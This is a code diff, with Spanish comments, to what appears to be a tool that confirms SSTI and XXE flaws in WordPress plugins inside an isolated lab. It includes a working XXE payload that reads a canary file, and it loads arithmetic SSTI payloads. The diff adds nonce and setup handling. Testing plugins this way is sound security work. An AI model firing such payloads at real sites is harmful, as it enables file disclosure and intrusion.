@@ -2710,6 +2710,8 @@ def verify_wordpress_ssti(
     parameters, ssti_param_hint: str = "",
     on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
     companion_plugins: Optional[list] = None,
+    extra_nonce_pages: Optional[list] = None,
+    extra_setup_trigger_paths: Optional[list] = None,
 ) -> WpVerifyResult:
     """Verifica server-side template injection con la misma idea que command injection: el payload
     pide al motor de plantillas que CALCULE un producto de dos numeros aleatorios (sintaxis de
@@ -2734,7 +2736,8 @@ def verify_wordpress_ssti(
     lab = _Lab(_token())
     try:
         boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
-                              companion_plugins=companion_plugins)
+                              companion_plugins=companion_plugins,
+                              extra_setup_trigger_paths=extra_setup_trigger_paths)
         if boot is None:
             return res
 
@@ -2759,18 +2762,24 @@ def verify_wordpress_ssti(
         # esperado (la mayoria son a*b, pero @() de ASP classic usa a+b, sintaxis distinta).
         from .payload_kb import load_ssti_arithmetic_payloads
         attempt_pairs = [(p, expected) for p in attempts] + load_ssti_arithmetic_payloads(a, b)
+
+        m = (http_method or "GET").upper()
+        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        endpoint, base_params = _auto_resolve_wp_blockers(
+            boot, lab, slug, m, endpoint, base_params, ssti_param, res, step,
+            extra_nonce_pages=extra_nonce_pages)
+
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
             "ssti_param": ssti_param, "a": a, "b": b, "producto_esperado": expected,
-            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
+            "metodo": m, "endpoint": endpoint,
         })
 
-        m = (http_method or "GET").upper()
         found = False
         tried = []
         for payload_value, payload_expected in attempt_pairs:
             pattern = re.compile(rf"(?<!\d){payload_expected}(?!\d)")
-            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload = dict(base_params)
             payload[ssti_param] = payload_value
             step(f"probando {m} {endpoint} con {ssti_param}={payload_value!r}...")
             try:
@@ -2839,6 +2848,8 @@ def verify_wordpress_xxe(
     parameters, xml_param_hint: str = "",
     on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
     companion_plugins: Optional[list] = None,
+    extra_nonce_pages: Optional[list] = None,
+    extra_setup_trigger_paths: Optional[list] = None,
 ) -> WpVerifyResult:
     """Verifica XML External Entity con el mismo patron de fichero canario que path-traversal/LFI
     (ver verify_wordpress_path_traversal): planta un secreto aleatorio en una ruta del sistema de
@@ -2859,7 +2870,8 @@ def verify_wordpress_xxe(
     lab = _Lab(_token())
     try:
         boot = _bootstrap_lab(lab, plugin_source_dir, slug, step, res, t0, budget_s,
-                              companion_plugins=companion_plugins)
+                              companion_plugins=companion_plugins,
+                              extra_setup_trigger_paths=extra_setup_trigger_paths)
         if boot is None:
             return res
 
@@ -2873,6 +2885,10 @@ def verify_wordpress_xxe(
         xxe_xml = (f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
                   f'"file://{canary_path}">]><foo>&xxe;</foo>')
         m = (http_method or "GET").upper()
+        base_params = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+        endpoint, base_params = _auto_resolve_wp_blockers(
+            boot, lab, slug, m, endpoint, base_params, xml_param, res, step,
+            extra_nonce_pages=extra_nonce_pages)
         res.evidence.update({
             "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
             "xml_param": xml_param or "(cuerpo crudo)", "canary_path": canary_path,
@@ -2933,7 +2949,7 @@ def verify_wordpress_xxe(
             if found:
                 break
             if xml_param:
-                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+                payload = dict(base_params)
                 payload[xml_param] = xml_body
                 try_send(f"{label}, parametro de formulario",
                          data=payload if m != "GET" else None,
